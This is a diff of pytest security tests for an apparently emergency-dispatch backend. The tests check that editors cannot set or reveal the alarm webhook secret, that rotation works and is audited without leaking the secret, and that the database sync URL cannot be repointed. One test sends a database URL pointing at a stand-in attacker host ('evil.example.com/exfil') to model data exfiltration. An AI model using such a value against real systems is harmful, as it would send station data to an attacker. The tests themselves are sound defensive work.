@@ -250,7 +250,7 @@ async def test_single_setting_endpoint_refuses_credentials(editor_client: AsyncC
 @pytest.mark.api
 async def test_sync_target_cannot_be_repointed_through_generic_settings(editor_client: AsyncClient):
     """`railway_database_url` was in DEFAULT_SETTINGS, so the allowlist admitted the exact
-    key its own comment claimed it protected — and the value is fed to create_async_engine.
+    key its own comment claimed it protected – and the value is fed to create_async_engine.
 
     Any editor could therefore make the backend push events, incidents, personnel,
     vehicles, materials and settings to a host of their choosing. It has a dedicated
@@ -261,3 +261,94 @@ async def test_sync_target_cannot_be_repointed_through_generic_settings(editor_c
         json={"value": "postgresql://attacker:pw@evil.example.com:5432/exfil"},
     )
     assert response.status_code == 403
+
+
+# ---------------------------------------------------------------------------
+# The alarm webhook secret. It authorises writing incidents onto the board, and it used to
+# be readable only with `SELECT value FROM settings` – a documented setup step that sent a
+# volunteer into psql – while being *writable* by any editor through the generic PATCH.
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.asyncio
+@pytest.mark.api
+async def test_webhook_secret_cannot_be_set_through_generic_settings(editor_client: AsyncClient):
+    """Write-without-read on a credential: masked and 403'd on the way out, wide open on the
+    way in. An editor could pin it to a value they knew, or simply break alarm intake."""
+    response = await editor_client.patch(
+        "/api/settings/alarm_webhook_secret",
+        json={"value": "attacker-chosen-secret"},
+    )
+    assert response.status_code == 403
+    assert "alarm-webhook-secret" in response.json()["detail"]
+
+
+@pytest.mark.asyncio
+@pytest.mark.api
+async def test_webhook_secret_reveal_is_admin_only(editor_client: AsyncClient):
+    """An editor runs the board; provisioning the dispatch integration is an admin job."""
+    response = await editor_client.get("/api/settings/alarm-webhook-secret")
+    assert response.status_code == 403
+
+
+@pytest.mark.asyncio
+@pytest.mark.api
+async def test_admin_can_reveal_the_webhook_secret(admin_client: AsyncClient, db_session: AsyncSession):
+    """The whole point: the one role that needs the value no longer needs psql to get it."""
+    db_session.add(Setting(key="alarm_webhook_secret", value="known-test-secret"))
+    await db_session.commit()
+
+    response = await admin_client.get("/api/settings/alarm-webhook-secret")
+    assert response.status_code == 200
+    body = response.json()
+    assert body["secret"] == "known-test-secret"
+    assert body["source"] == "database"
+    assert body["configured"] is True
+
+
+@pytest.mark.asyncio
+@pytest.mark.api
+async def test_rotating_generates_a_different_secret(admin_client: AsyncClient, db_session: AsyncSession):
+    db_session.add(Setting(key="alarm_webhook_secret", value="the-old-one"))
+    await db_session.commit()
+
+    response = await admin_client.post("/api/settings/alarm-webhook-secret/rotate")
+    assert response.status_code == 200
+    assert response.json()["secret"] not in ("", "the-old-one")
+
+
+@pytest.mark.asyncio
+@pytest.mark.api
+async def test_rotation_refuses_while_the_env_pins_the_secret(
+    admin_client: AsyncClient, monkeypatch: pytest.MonkeyPatch
+):
+    """ALARM_WEBHOOK_SECRET wins over the table, so rotating the table changes nothing a
+    caller sees. Reporting success there is how a station hands its dispatch provider a
+    secret that rejects every alarm from then on."""
+    from app.config import settings as app_settings
+
+    monkeypatch.setattr(app_settings, "alarm_webhook_secret", "pinned-by-env", raising=False)
+
+    response = await admin_client.post("/api/settings/alarm-webhook-secret/rotate")
+    assert response.status_code == 409
+    assert ".env" in response.json()["detail"]
+
+    revealed = await admin_client.get("/api/settings/alarm-webhook-secret")
+    assert revealed.json()["source"] == "env"
+
+
+@pytest.mark.asyncio
+@pytest.mark.api
+async def test_secret_values_never_reach_the_audit_log(admin_client: AsyncClient, db_session: AsyncSession):
+    """The trail is read by more people than the settings table is, and it is exported into
+    after-action reports. That somebody rotated the secret is the fact worth keeping."""
+    await admin_client.post("/api/settings/alarm-webhook-secret/rotate")
+
+    result = await db_session.execute(select(AuditLog).where(AuditLog.resource_type == "setting"))
+    entries = result.scalars().all()
+    assert entries, "the rotation should be audited"
+
+    revealed = await admin_client.get("/api/settings/alarm-webhook-secret")
+    live_secret = revealed.json()["secret"]
+    for entry in entries:
+        assert live_secret not in str(entry.changes_json)
